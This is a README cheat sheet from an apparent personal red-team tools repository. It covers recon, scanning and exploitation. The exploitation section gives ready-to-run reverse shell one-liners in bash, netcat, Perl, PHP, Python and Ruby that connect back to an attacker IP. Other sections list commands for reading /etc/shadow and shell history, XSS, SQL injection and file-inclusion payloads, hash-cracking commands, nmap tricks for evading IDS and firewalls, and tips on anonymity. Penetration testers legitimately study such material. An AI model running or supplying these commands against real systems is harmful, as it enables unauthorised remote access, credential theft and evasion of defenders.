# 🛠️ Red team tools, tips & tricks

A collection of random custom scripts for penetration testing and red team tasks.

## 📌 Includes

* 🔁 Automation scripts
* 🔍 Reconnaissance tools
* 📡 Scanning utilities
* 💥 Exploitation scripts
* 🩻 Post-exploitation helpers
* 📄 Report generation tools
* 🗒️ Notes & cheat sheets



## 📚 Table of Contents

* [Tips-tricks](#-tips--tricks)
* [Recon & Enumeration](#-recon--enumeration)
* [Scanning](#scanning)
* [Exploitation](#-exploitation)
* [Post-Exploitation](#-post-exploitation)
* [Web Attacks](#-web-attacks)
* [Password Attacks](#-password-attacks)
* [Tools Reference](#-tools-reference)
* [General Notes](#-general-notes)

-----

📂 Repo-Structure
```
red-team-tools/
├── automation/
├── recon/
├── scanning/
├── exploitation/
├── post-exploitation/
├── reporting/
├── utilities/
├── offensive-ops/
└── README.md/
```

---

## 🌟 Tips & tricks



***Find your public IP address right on the terminal***
```
curl -s wtfismyip.com/json | jq
curl ifconfig.me
```

### Stay anonymous
\- ⚠️ Anonymity is not just the tool — it’s behavior. One slip (like logging into your mail or reusing usernames) can burn the whole setup.

***Multi-Layered Anonymization Solution(VPN + Tor + Sandboxing)***
1. Operating systems
   
\- Tails OS  

\- Whonix workstation & gateway  

\- Qubes OS  



&nbsp;


2. Tor-Enabled Anonymization software
\- ParrotOS anonsurf  

\- [Auto_Tor_IP_changer by FDX100](https://github.com/FDX100/Auto_Tor_IP_changer )  

\- [ kali-anonsurf by Und3rf10w](https://github.com/Und3rf10w/kali-anonsurf )  

\- [Kalitorify by brainfucksec](https://github.com/brainfucksec/kalitorify)   

\- [Anonsurf-multiplatform by SuperKPK99](https://github.com/SuperKPK99/anonsurf-multiplatform )  

\- Mullvad CLI + script  

\- Torghostng 

\- Gluetun + Mullvad rotate (docker)  

\- WireGuard key-rotate scripts  


&nbsp;



### Automation
***Automatically install essential hacking & dev tools on a fresh linux install***

\- [Install tools script](https://github.com/80h3m14n/red-team-tools/blob/main/automation/install-tools.sh)


***Encrypting and decrypting files, directories, and text using multiple encryption algorithms***

\- [Encryptz](https://github.com/80h3m14n/encryptz)



***Change Microsoft windows themes & font type***

1. Reg file(run as admin and reboot)
\- [Segoe Print Font](https://github.com/80h3m14n/red-team-tools/blob/main/utilities/segoe-print-font.reg)


\- You can open the file with notepad and change the font according to your preference.


2. Green Powershell
```
$Host.UI.RawUI.ForegroundColor = 'Green'
```


3. Command Prompt color

\- Navigate to Environmental Variables > New User variable
```
Name: prompt
Value: $E[1;30;104m►$E[1;37;104m $P $E[1;94;40m►$E[0m
```


✅ To exploit a software, you MUST have a background knowledge of defense mechanisms used by the software

✅ Figure out how to trigger an undiscovered vulnerability yourself, boom, zero day

✅ Every failed exploit has a stealthier alternative



---

## 🔍 Recon & Enumeration

```bash
# DNS Lookup
dig domain.com any +short
host domain.com

# Subdomain fuzzing
ffuf -w subs.txt -u https://FUZZ.target.com
```



---

## Scanning

### Stealth Techniques

To bypass firewall blocks and avoid IDS/IPS detection:

\- Slow Scans: Introduce delays between packets to evade rate-based detection.

```
sudo nmap -sS -v -v -Pn 192.168.0.0/24
```

\- Fragmentation: Split packets to confuse firewalls and IDS.

\- Decoy Scans: Use spoofed IPs to hide the real source and overwhelm logging systems.

\- Custom Source Ports: Bypass firewall rules that allow traffic from specific ports (e.g., DNS on 53)

\- Try alternative tools

```
# Nmap full scan
nmap -p- -T4 -A -v target.com
sudo nmap 10.0.0.1/24 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2
```

-----


## 💥 Exploitation


**Bash**
```bash Reverse Shell One-Liners
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

**Netcat reverse shell**
```Netcat Reverse Shell One-Liners
nc -e /bin/sh IP PORT
```

Netcat without -e Reverse Shell One-Liners
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
```

Perl Reverse Shell One-Liners
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

PHP Reverse Shell One-Liners
```
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Python Reverse Shell One-Liners
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Ruby Reverse Shell One-Liners
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## 🩻 Post-Exploitation

```bash
# Grab users & creds
cat /etc/passwd
cat /etc/shadow
history

# Network info
ip a
netstat -tulpn

# SUID Binaries
find / -perm -4000 -type f 2>/dev/null
```

\- [LOLBAS project - Windows ](https://lolbas-project.github.io/)  
\- [GTOBins - Linux](https://gtfobins.github.io/) 



### 🧱 Privilege Escalation

```bash
# Check kernel for exploits
uname -a
linux-exploit-suggester.sh

# Check sudo rights
sudo -l

# Writable files/directories
find / -writable -type f 2>/dev/null
```

---

## 💬 Web Attacks

```bash
# XSS payload
<script>alert('xss')</script>

# SQL Injection test
' OR '1'='1

# Local File Inclusion
../../../../etc/passwd
```

---

## 🔐 Password Attacks

```bash
# Hashcat basic usage
hashcat -m 0 hash.txt rockyou.txt

# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Zip password crack
fcrackzip -v -u -D -p rockyou.txt file.zip
```

---

## 🧰 Tools Reference

```bash
# Gobuster
gobuster dir -u http://target.com -w wordlist.txt

# Nikto
nikto -h http://target.com

# Burp Suite
# Set proxy to 127.0.0.1:8080 and route traffic from tools
```




## 📝 General Notes
Check for .bak, .old, .zip files on webservers

Default creds go a long way

Look for dev/test/staging endpoints

Don’t sleep on SSRF, IDOR, or misconfigured cloud buckets

Always verify shell stability (TTY, backgrounding)



**Additional resources**
\- [Roadmaps](https://roadmap.sh/)
\- [LOLBAS project - Windows ](https://lolbas-project.github.io/)  
\- [GTOBins - Linux](https://gtfobins.github.io/)
\- [Atomic red team](https://github.com/redcanaryco/atomic-red-team)
\- [Zero-day](https://www.zero-day.cz/)



---

## 🧾 License

Free to use, share, and modify under the MIT License.


---

## ⚠️ Disclaimer

This repository is strictly for **educational and research** purposes.
I take **no responsibility** for misuse, illegal activity, or any damage caused by these tools.
**Use responsibly. Don't be dumb.**

